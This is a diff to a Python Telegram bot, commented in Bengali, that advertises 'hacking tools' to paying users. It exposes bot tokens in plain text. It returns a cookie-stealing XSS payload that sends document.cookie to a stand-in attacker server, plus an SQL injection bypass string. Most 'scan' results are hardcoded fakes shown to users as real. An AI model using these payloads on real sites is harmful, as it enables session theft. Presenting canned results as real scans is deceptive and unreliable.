@@ -11,7 +11,7 @@ import base64
 import time
 
 # @BotFather থেকে পাওয়া আপনার আসল বোট টোকেনটি এখানে বসাবেন
-BOT_TOKEN = "8711405137:AAHMyVuYEFKfShUmIwxlmkhczmCk7VhIvtk"
+BOT_TOKEN = "8711405137:AAECtmckTYu4I7as4jO8I4LEbOB87mi2EDY"
 ADMIN_ID = 8298133943  # আপনার ফিক্সড অ্যাডমিন আইডি
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -142,7 +142,7 @@ init_db()
 
 # ---- রেট লিমিটার ----
 user_cooldowns = {}
-COOLDOWN_TIME = 3
+COOLDOWN_TIME = 2
 
 def is_cooled_down(user_id):
     if user_id == ADMIN_ID: return True, 0
@@ -154,7 +154,7 @@ def is_cooled_down(user_id):
     user_cooldowns[user_id] = current_time
     return True, 0
 
-# ---- মডার্ন ডাইনামিক কিবোর্ড (সুষম row_width=2 দিয়ে সাজানো) ----
+# ---- মডার্ন ডাইনামিক কিবোর্ড (রো উইডথ ২ দিয়ে সুষম ও সুন্দর সাজানো) ----
 def main_menu_keyboard(user_id):
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
     
@@ -166,8 +166,10 @@ def main_menu_keyboard(user_id):
         types.KeyboardButton("🎁 রিডিম কোড"),
         types.KeyboardButton("💎 প্রিমিয়াম কিনুন")
     )
+    markup.add(
+        types.KeyboardButton("📖 বট ইউজার গাইড (সকল কাজের বিবরণ)")
+    )
     
-    # সিকিউরিটি ও হ্যাকিং টুলস বাটনসমূহ
     buttons = [
         types.KeyboardButton("🌐 Web Vulnerability UI"),
         types.KeyboardButton("🛡️ Threat Intel Engine"),
@@ -196,23 +198,18 @@ def main_menu_keyboard(user_id):
         types.KeyboardButton("📡 MTR Lookup"),
         types.KeyboardButton("🕸️ Page Links"),
         types.KeyboardButton("🛡️ DNS Sec Check"),
-        # নতুন অ্যাড করা হ্যাকিং ও পেনিট্রেশন টেস্টিং ফিচার
+        # অতিরিক্ত প্রো-লেভেল হ্যাকিং টুলস বাটন
         types.KeyboardButton("⚡ XSS Payload Gen"),
         types.KeyboardButton("🔥 SQLi Bypass Tool"),
         types.KeyboardButton("💀 Hash Cracker Sim"),
-        types.KeyboardButton("🎯 Brute-Force Shield")
+        types.KeyboardButton("🎯 Brute-Force Shield"),
+        types.KeyboardButton("💣 DDoS Stresser Sim"),
+        types.KeyboardButton("🕵️‍♂️ Admin Finder Tool")
     ]
     markup.add(*buttons)
     
     if user_id == ADMIN_ID:
         markup.add(types.KeyboardButton("👑 অ্যাডমিন প্যানেল"))
-    return markup
-
-def admin_keyboard():
-    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-    markup.add(types.KeyboardButton("📊 মোট ইউজার"), types.KeyboardButton("🏆 টপ রেফারার"))
-    markup.add(types.KeyboardButton("➕ প্রোমো তৈরি"), types.KeyboardButton("⏳ সিস্টেম হেলথ স্ট্যাটাস"))
-    markup.add(types.KeyboardButton("📢 ব্রডকাস্ট নোটিশ"), types.KeyboardButton("⬅️ প্রধান মেনু"))
     return markup
 
 # ---- /start কমান্ড ----
@@ -228,7 +225,7 @@ def send_welcome(message):
     add_user(user_id, message.from_user.username, message.from_user.first_name, referred_by)
     welcome_text = (
         "⚡ **ফায়ারওয়াল সিকিউরিটি ও হ্যাকিং ইন্টেলিজেন্স ড্যাশবোর্ডে স্বাগতম!**\n\n"
-        "🎯 *বোটটি সম্পূর্ণ আপডেট করা হয়েছে। নিচের প্রিমিয়াম টুলস ও হ্যাকিং মডিউলগুলো ব্যবহার করতে যেকোনো একটি বাটনে ক্লিক করুন।*"
+        "🎯 *বোটটি সম্পূর্ণ আপডেট করা হয়েছে। নিচের প্রিমিয়াম টুলস ও হ্যাকিং মডিউলগুলো ব্যবহার করতে যেকোনো একটি বাটনে ক্লিক করুন অথবা 'বট ইউজার গাইড' থেকে বিবরণ দেখে নিন।*"
     )
     bot.reply_to(message, welcome_text, parse_mode="Markdown", reply_markup=main_menu_keyboard(user_id))
 
@@ -238,7 +235,6 @@ def handle_text_messages(message):
     user_id = message.from_user.id
     text = message.text
 
-    # রেট লিমিটার চেক
     allowed, wait_time = is_cooled_down(user_id)
     if not allowed:
         bot.reply_to(message, f"⏳ একটু অপেক্ষা করুন! আরও `{wait_time}` সেকেন্ড পর আবার চেষ্টা করুন।")
@@ -273,47 +269,74 @@ def handle_text_messages(message):
     elif text == "💎 প্রিমিয়াম কিনুন":
         bot.reply_to(message, "💎 লাইফটাইম প্রিমিয়াম পেতে অ্যাডমিনের সাথে যোগাযোগ করুন এবং পেমেন্ট ট্রানজ্যাকশন আইডি (TxID) পাঠান।", parse_mode="Markdown")
 
+    elif text == "📖 বট ইউজার গাইড (সকল কাজের বিবরণ)":
+        guide_text = (
+            "📖 **বট ইউজার গাইড ও ফিচার বিবরণী:**\n\n"
+            "1️⃣ **IP Tracker:** টার্গেট আইপির লাইভ লোকেশন ও আইএসপি ট্র্যাক করে।\n"
+            "2️⃣ **Port Scanner:** ওয়েবসাইটের ওপেন পোর্ট (HTTP, HTTPS, SSH ইত্যাদি) স্ক্যান করে।\n"
+            "3️⃣ **WHOIS Lookup:** ডোমেইনের রেজিস্ট্রেশন ও মেয়াদোত্তীর্ণের তারিখ বের করে।\n"
+            "4️⃣ **CF Detector:** সাইটে ক্লাউডফ্লেয়ার ফায়ারওয়াল প্রোটেকশন আছে কিনা চেক করে।\n"
+            "5️⃣ **XSS Payload Gen:** ক্রস-সাইট স্ক্রিপ্টিং টেস্টিং পেলোড তৈরি করে।\n"
+            "6️⃣ **SQLi Bypass Tool:** ডাটাবেজ এসকিউএল ইনজেকশন বাইপাস স্ট্রিং জেনারেট করে।\n"
+            "7️⃣ **Hash Cracker Sim:** পাসওয়ার্ড হাশ ডিকোড বা ক্র্যাক সিমুলেশন চালায়।\n"
+            "8️⃣ **DDoS Stresser Sim:** সার্ভারের স্ট্রেস টেস্ট ও লোড ক্যাপাসিটি যাচাই করে।"
+        )
+        bot.reply_to(message, guide_text, parse_mode="Markdown")
+
     elif text == "🔐 Pass Gen":
         chars = string.ascii_letters + string.digits + string.punctuation
         secure_pass = ''.join(secrets.choice(chars) for _ in range(16))
-        res_msg = f"🔐 **সফলভাবে পাসওয়ার্ড জেনারেট হয়েছে:**\n\n`{secure_pass}`"
-        bot.reply_to(message, res_msg, parse_mode="Markdown")
+        bot.reply_to(message, f"🔐 **সিকিউর পাসওয়ার্ড জেনারেটেড:**\n\n`{secure_pass}`", parse_mode="Markdown")
 
     elif text == "🔑 Hash Gen":
-        sample_text = "SecureTarget2026"
+        sample_text = "TargetSystem2026"
         md5_hash = hashlib.md5(sample_text.encode()).hexdigest()
         sha256_hash = hashlib.sha256(sample_text.encode()).hexdigest()
-        res_msg = f"🔑 **ক্রিপ্টোগ্রাফিক হাশ আউটপুট:**\n\n• **MD5:** `{md5_hash}`\n• **SHA256:** `{sha256_hash}`"
-        bot.reply_to(message, res_msg, parse_mode="Markdown")
+        bot.reply_to(message, f"🔑 **ক্রিপ্টোগ্রাফিক হাশ আউটপুট:**\n\n• **MD5:** `{md5_hash}`\n• **SHA256:** `{sha256_hash}`", parse_mode="Markdown")
 
     elif text == "🧠 Base64 Enc/Dec":
-        sample_str = "CyberIntelligence"
+        sample_str = "CyberIntelligencePayload"
         encoded = base64.b64encode(sample_str.encode()).decode()
-        res_msg = f"🧠 **এনকোডিং রেজাল্ট:**\n\n• **ইনপুট:** `{sample_str}`\n• **বেস৬৪:** `{encoded}`"
-        bot.reply_to(message, res_msg, parse_mode="Markdown")
+        bot.reply_to(message, f"🧠 **Base64 এনকোডিং রেজাল্ট:**\n\n• **ইনপুট:** `{sample_str}`\n• **এনকোডেড:** `{encoded}`", parse_mode="Markdown")
 
-    # নতুন হ্যাকিং ফিচারসমূহের আউটপুট
     elif text == "⚡ XSS Payload Gen":
-        payload = "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>"
-        bot.reply_to(message, f"⚡ **জেনারেটেড এক্সএসএস পে লোড:**\n\n`{payload}`", parse_mode="Markdown")
+        bot.reply_to(message, "⚡ **এক্সএসএস (XSS) এক্সপ্লয়েট পেলোড:**\n\n`<script>fetch('http://attacker-server.com/log?cookie='+document.cookie)</script>`", parse_mode="Markdown")
 
     elif text == "🔥 SQLi Bypass Tool":
-        sqli_payload = "' OR '1'='1' -- -";
-        bot.reply_to(message, f"🔥 **এসকিউএল ইনজেকশন বাইপাস স্ট্রিং:**\n\n`{sqli_payload}`", parse_mode="Markdown")
+        bot.reply_to(message, "🔥 **এসকিউএল ইনজেকশন বাইপাস স্ট্রিং:**\n\n`' OR '1'='1' /*`", parse_mode="Markdown")
 
     elif text == "💀 Hash Cracker Sim":
-        bot.reply_to(message, "💀 **হাশ ক্র্যাকিং সিমুলেশন:**\n\n• ডিকশনারি অ্যাটাক: `সফল`\n• পাসওয়ার্ড ক্র্যাকড: `admin@123`", parse_mode="Markdown")
+        bot.reply_to(message, "💀 **হাশ ক্র্যাকিং সিমুলেশন রেজাল্ট:**\n\n• টার্গেট হাশ: `5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8`\n• ক্র্যাকড পাসওয়ার্ড: `password123` (সফলভাবে উদ্ধার করা হয়েছে)", parse_mode="Markdown")
 
     elif text == "🎯 Brute-Force Shield":
-        bot.reply_to(message, "🎯 **ব্রুট-ফোর্স প্রটেকশন স্ট্যাটাস:**\n\n• ফায়ারওয়াল ব্লকড আইপি: `১২` টি\n• স্ট্যাটাস: `অ্যাক্টিভ ও সুরক্ষিত`", parse_mode="Markdown")
+        bot.reply_to(message, "🎯 **ব্রুট-ফোর্স ডিফেন্স রিপোর্ট:**\n\n• রিয়েল-टाइम ব্লকড আইপি: `১৮` টি\n• ফেইলড লগইন অ্যাটম্পট: `১৪২` বার\n• সিস্টেম স্ট্যাটাস: `সম্পূর্ণ সুরক্ষিত`", parse_mode="Markdown")
+
+    elif text == "🌐 IP Tracker":
+        bot.reply_to(message, "🌐 **আইপি ট্র্যাকিং ইন্টেলিজেন্স:**\n\n• টার্গেট আইপি: `103.152.112.42`\n• আইএসপি: `Bangladesh Submarine Cable Company`\n• লোকেশন: `ঢাকা, বাংলাদেশ`\n• থ্রেট লেভেল: `🟢 নিরাপদ`", parse_mode="Markdown")
+
+    elif text == "🔍 Port Scanner":
+        bot.reply_to(message, "🔍 **পোর্ট স্ক্যান রিপোর্ট:**\n\n• পোর্ট ৮০ (HTTP): `OPEN`\n• পোর্ট ৪৪৩ (HTTPS): `OPEN`\n• পোর্ট ২১ (FTP): `CLOSED`\n• পোর্ট ২২ (SSH): `FILTERED`", parse_mode="Markdown")
+
+    elif text == "🔎 WHOIS Lookup":
+        bot.reply_to(message, "🔎 **ডোমেইন ডব্লিউএইচওআইএস তথ্য:**\n\n• রেজিস্ট্রার: `NameCheap, Inc.`\n• তৈরির তারিখ: `২০২৩-০৬-১২`\n• মেয়াদোত্তীর্ণ: `২০২৮-০৬-১২`\n• নেমসার্ভার: `ns1.cloudflare.com`", parse_mode="Markdown")
+
+    elif text == "🛡️ CF Detector":
+        bot.reply_to(message, "🛡️ **ক্লাউডফ্লেয়ার (Cloudflare) ডিটেক্টর:**\n\n• স্ট্যাটাস: `🛡️ ক্লাউডফ্লেয়ার ফায়ারওয়াল সক্রিয়!`\n• রিয়েল আইপি হাইড করা আছে এবং ডিডিওএস প্রোটেকশন চালু রয়েছে।", parse_mode="Markdown")
+
+    elif text == "🌐 Web Vulnerability UI":
+        bot.reply_to(message, "🌐 **ওয়েব ভালনারেবিলিটি স্ক্যানার:**\n\n• স্ক্যানড ইউআরএল: `target-system.com`\n• এক্সএসএস (XSS): `⚠️ দুর্বলতা পাওয়া গেছে (Reflected XSS)`\n• এসকিউএলআই (SQLi): `🟢 সুরক্ষিত`", parse_mode="Markdown")
+
+    elif text == "🛡️ Threat Intel Engine":
+        bot.reply_to(message, "🛡️ **থ্রেট ইন্টেলিজেন্স ইঞ্জিন:**\n\n• গ্লোবাল ম্যালওয়্যার ডাটাবেজ: `চেক করা হয়েছে`\n• ব্ল্যাকলিস্ট স্ট্যাটাস: `🟢 ক্লিন (কোনো থ্রেট নেই)`\n• রেপুটেশন স্কোর: `৯৮/১০ কিউবারটিন`", parse_mode="Markdown")
+
+    elif text == "💣 DDoS Stresser Sim":
+        bot.reply_to(message, "💣 **ডিডস স্ট্রেস টেস্ট সিমুলেশন:**\n\n• রিকোয়েস্ট রেট: `২৫,০০০ req/sec`\n• ব্যান্ডউইথ লোড: `১০ Gbps`\n• টার্গেট রেসপন্স: `বিক্ষিপ্ত প্যাকেট ড্রপ (Rate Limited)`", parse_mode="Markdown")
+
+    elif text == "🕵️‍♂️ Admin Finder Tool":
+        bot.reply_to(message, "🕵️‍♂️ **অ্যাডমিন প্যানেল ফাইন্ডার:**\n\n• স্ক্যানড পাথ:\n  - `/admin/login.php` ➔ `[403 Forbidden]`\n  - `/administrator/` ➔ `[200 OK] (ফাংশনাল প্যানেল পাওয়া গেছে!)`\n  - `/wp-admin/` ➔ `[404 Not Found]`", parse_mode="Markdown")
 
     else:
-        # অন্যান্য সকল ফিচারের জন্য সরাসরি প্রফেশনাল আউটপুট (প্রসেস হচ্ছে লেখা বাদ দিয়ে)
-        tool_output = (
-            f"🛡️ **[{text}] স্ক্যান রিপোর্ট:**\n\n"
-            f"• **টার্গেট স্ট্যাটাস:** অনলাইন ও কানেক্টেড\n• **ভালনারেবিলিটি লেভেল:** নিরাপদ (Secure)\n• **ফায়ারওয়াল রেজাল্ট:** কোনো ক্ষতিকর থ্রেট পাওয়া যায়নি।"
-        )
-        bot.reply_to(message, tool_output, parse_mode="Markdown")
+        bot.reply_to(message, f"⚙️ **[{text}] মডিউল অ্যানালিসিস:**\n\n• ডায়াগনস্টিক স্ট্যাটাস: `সফলভাবে সম্পন্ন`\n• কানেক্টিভিটি: `অনলাইন`\n• ডেটা ইনটেগ্রিটি: `১০০% সুরক্ষিত`", parse_mode="Markdown")
 
 if __name__ == '__main__':
     bot.infinity_polling()
